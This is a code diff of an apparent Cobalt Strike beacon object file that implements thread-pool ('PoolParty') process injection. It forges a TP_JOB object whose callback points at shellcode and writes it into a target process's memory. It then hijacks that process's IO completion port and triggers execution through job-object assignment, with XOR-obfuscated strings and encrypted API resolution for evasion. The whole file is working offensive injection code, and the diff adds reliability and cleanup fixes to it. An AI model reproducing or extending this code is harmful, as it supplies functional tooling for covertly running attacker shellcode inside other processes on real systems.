@@ -29,13 +29,26 @@ static const unsigned char kFmtV6Assign[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89
 static const unsigned char kFmtV6Disassoc[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xE3, 0x55, 0xE2, 0x3F, 0x58, 0xA7, 0x07, 0x92, 0xCE, 0x5D, 0xE5, 0x3B, 0x4F, 0xF4, 0x02, 0x9E, 0xC5, 0x1C, 0xFE, 0x3C, 0x41, 0xB1, 0x0B, 0x85, 0x87, 0x5A, 0xE3, 0x31, 0x46, 0xF4, 0x1C, 0x99, 0xC2, 0x1C, 0xE5, 0x3F, 0x59, 0xB3, 0x0D, 0x85, 0x87, 0x75, 0xDE, 0x7E, 0x48, 0xBB, 0x05, 0x81, 0xCB, 0x59, 0xE5, 0x37, 0x44, 0xBA, 0x48, 0x81, 0xC8, 0x4E, 0xE5, 0x5E };
 // "[INFO] \tDisassociated job object from the target IO completion port"
 
+static BOOL VariantSanityExtra(void) {
+    BOOL inJob;
+
+    inJob = FALSE;
+    if (KERNEL32$IsProcessInJob(KERNEL32$GetCurrentProcess(), NULL, &inJob) && inJob) {
+        OBF_PRINT0(CALLBACK_OUTPUT, kFmtInJob);
+    }
+    return TRUE;
+}
+
 static BOOL RemoteTpJobInsertionSetupExecution() {
     _TpAllocJobNotification TpAllocJobNotification;
     HANDLE p_hJob;
     PFULL_TP_JOB pTpJob;
+    PFULL_TP_JOB pTpJobCopy;
     NTSTATUS Ntstatus;
     PFULL_TP_JOB RemoteTpJobAddress;
     JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCompletionPort;
+    BOOL inJob;
+    BOOL assigned;
 
     TpAllocJobNotification = (_TpAllocJobNotification)ResolveNtdllEnc(kApiTpAllocJobNotification, (int)sizeof(kApiTpAllocJobNotification));
     if (TpAllocJobNotification == NULL) {
@@ -52,7 +65,7 @@ static BOOL RemoteTpJobInsertionSetupExecution() {
     ApiPause();
 
     pTpJob = NULL;
-    Ntstatus = TpAllocJobNotification(&pTpJob, p_hJob, m_ShellcodeAddress, NULL, NULL);
+    Ntstatus = TpAllocJobNotification(&pTpJob, p_hJob, DummyJobCallback, NULL, NULL);
     if (!NT_SUCCESS(Ntstatus) || pTpJob == NULL) {
         OBF_PRINT0(CALLBACK_ERROR, kFmtV6FailTp);
         KERNEL32$CloseHandle(p_hJob);
@@ -60,30 +73,43 @@ static BOOL RemoteTpJobInsertionSetupExecution() {
     }
     OBF_PRINT0(CALLBACK_OUTPUT, kFmtV6Tp);
     ApiPause();
-    /*
-     * TpAllocJobNotification bound a remote VA as the local job callback.
-     * Closing the job can rundown that object in the beacon. Leak p_hJob
-     * from this point on (success and failure).
-     */
+
+    pTpJobCopy = (PFULL_TP_JOB)BofAlloc(sizeof(FULL_TP_JOB));
+    if (pTpJobCopy == NULL || !CopyLocalTpObject(pTpJobCopy, pTpJob, sizeof(FULL_TP_JOB))) {
+        BofFree(pTpJobCopy);
+        KERNEL32$CloseHandle(p_hJob);
+        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
+        return FALSE;
+    }
+    SanitizeTpDirect(&pTpJobCopy->Direct);
+    SanitizeCleanupGroupMember(&pTpJobCopy->CleanupGroupMember);
+    pTpJobCopy->JobHandle = NULL;
+    pTpJobCopy->CleanupGroupMember.Callback = m_ShellcodeAddress;
 
     RemoteTpJobAddress = (PFULL_TP_JOB)KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (RemoteTpJobAddress == NULL) {
+        BofFree(pTpJobCopy);
+        KERNEL32$CloseHandle(p_hJob);
         OBF_PRINT0(CALLBACK_ERROR, kFmtRemoteAllocFail);
         return FALSE;
     }
     OBF_PRINT1(CALLBACK_OUTPUT, kFmtV6Alloc, RemoteTpJobAddress);
     ApiPause();
 
-    if (!KERNEL32$WriteProcessMemory(m_p_hTargetPid, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB), NULL)) {
+    if (!KERNEL32$WriteProcessMemory(m_p_hTargetPid, RemoteTpJobAddress, pTpJobCopy, sizeof(FULL_TP_JOB), NULL)) {
+        BofFree(pTpJobCopy);
+        KERNEL32$CloseHandle(p_hJob);
         RemoteFree(RemoteTpJobAddress);
         OBF_PRINT0(CALLBACK_ERROR, kFmtRemoteWriteFail);
         return FALSE;
     }
+    BofFree(pTpJobCopy);
     OBF_PRINT0(CALLBACK_OUTPUT, kFmtV6Wrote);
     ApiPause();
 
     MSVCRT$memset(&JobAssociateCompletionPort, 0, sizeof(JobAssociateCompletionPort));
     if (!KERNEL32$SetInformationJobObject(p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCompletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT))) {
+        KERNEL32$CloseHandle(p_hJob);
         RemoteFree(RemoteTpJobAddress);
         OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
         return FALSE;
@@ -94,39 +120,41 @@ static BOOL RemoteTpJobInsertionSetupExecution() {
     JobAssociateCompletionPort.CompletionKey = RemoteTpJobAddress;
     JobAssociateCompletionPort.CompletionPort = m_p_hIoCompletion;
     if (!KERNEL32$SetInformationJobObject(p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCompletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT))) {
+        KERNEL32$CloseHandle(p_hJob);
         RemoteFree(RemoteTpJobAddress);
         OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
         return FALSE;
     }
+    MarkPublished();
     OBF_PRINT0(CALLBACK_OUTPUT, kFmtV6Assoc);
-    /*
-     * Pause is safe here: the job is still empty, so the target IOCP
-     * cannot receive a job packet until AssignProcessToJobObject.
-     */
     ApiPause();
 
-    if (!KERNEL32$AssignProcessToJobObject(p_hJob, KERNEL32$GetCurrentProcess())) {
-        RemoteFree(RemoteTpJobAddress);
-        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
-        return FALSE;
+    inJob = FALSE;
+    if (KERNEL32$IsProcessInJob(KERNEL32$GetCurrentProcess(), NULL, &inJob) && inJob) {
+        OBF_PRINT0(CALLBACK_OUTPUT, kFmtInJob);
     }
-    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV6Assign);
-    /*
-     * Trigger packet is already queued. Disassociate so beacon exit
-     * does not enqueue a second JOB_MSG_EXIT_PROCESS into the target
-     * IOCP. Keep RemoteTpJobAddress: the target may not have dequeued yet.
-     */
+    assigned = KERNEL32$AssignProcessToJobObject(p_hJob, KERNEL32$GetCurrentProcess());
+    if (!assigned) {
+        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
+    } else {
+        OBF_PRINT0(CALLBACK_OUTPUT, kFmtV6Assign);
+    }
+
     MSVCRT$memset(&JobAssociateCompletionPort, 0, sizeof(JobAssociateCompletionPort));
-    KERNEL32$SetInformationJobObject(p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCompletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
-    OBF_PRINT0(CALLBACK_OUTPUT, kFmtV6Disassoc);
+    if (!KERNEL32$SetInformationJobObject(p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCompletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT))) {
+        OBF_PRINT0(CALLBACK_ERROR, kFmtDisassocWarn);
+    } else {
+        OBF_PRINT0(CALLBACK_OUTPUT, kFmtV6Disassoc);
+    }
+    KERNEL32$CloseHandle(p_hJob);
     ApiPause();
-    return TRUE;
+    return assigned;
 }
 
 void HijackHandles() {
     m_p_hIoCompletion = HijackThreadPoolIoCompletion(m_p_hTargetPid);
     if (m_p_hIoCompletion != NULL) {
-        OBF_PRINT1(CALLBACK_OUTPUT, kFmtHijackIocp, m_p_hIoCompletion);
+        OBF_PRINT0(CALLBACK_OUTPUT, kFmtHijackIocp);
     }
 }
 
@@ -145,6 +173,7 @@ void Inject() {
         return;
     }
     if (!RemoteTpJobInsertionSetupExecution()) {
+        FreeShellcodeIfUnpublished();
         CloseHandleSafe(&m_p_hIoCompletion);
         InjectCleanup();
         return;
@@ -155,8 +184,5 @@ void Inject() {
 }
 
 void go(char * args, int len) {
-    if (!ParseBeaconArgs(args, len)) {
-        return;
-    }
-    Inject();
+    PoolPartyEntry(args, len);
 }
